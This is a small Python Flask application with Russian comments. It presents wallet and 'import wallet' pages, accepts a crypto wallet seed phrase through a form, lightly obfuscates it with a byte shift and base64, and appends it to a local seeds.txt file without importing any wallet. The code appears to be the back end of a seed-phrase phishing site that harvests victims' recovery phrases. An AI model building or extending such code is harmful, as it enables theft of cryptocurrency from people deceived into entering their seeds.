from flask import Flask, render_template, request, redirect, url_for
import base64

app = Flask(__name__)

# Числовой ключ для шифровки
KEY = 130995

# Простая шифровка по числовому ключу
def encrypt_phrase(phrase, key):
    key = int(key) % 256
    encrypted_bytes = bytes([(ord(c) + key) % 256 for c in phrase])
    return base64.b64encode(encrypted_bytes).decode()  # кодируем в base64


# Главная страница
@app.route('/')
def index():
    return render_template('index.html')

# Вторая страница
@app.route('/wallet')
def wallet():
    return render_template('wallet.html')

@app.route('/error', methods=['GET', 'POST'])
def error():
    return render_template('error.html')



# Третья страница: импорт кошелька
@app.route('/import', methods=['GET', 'POST'])
def import_wallet():
    if request.method == 'POST':
        seed_phrase = request.form.get('seed')  # поле формы <textarea name="seed">
        if seed_phrase:
            encrypted = encrypt_phrase(seed_phrase, KEY)
            
            # Сохраняем зашифрованную фразу в локальный файл
            with open('seeds.txt', 'a', encoding='utf-8') as f:
                f.write(encrypted + '\n')
            
            return "Фраза сохранена успешно!"
    return render_template('import.html')


if __name__ == '__main__':
    app.run(debug=True)
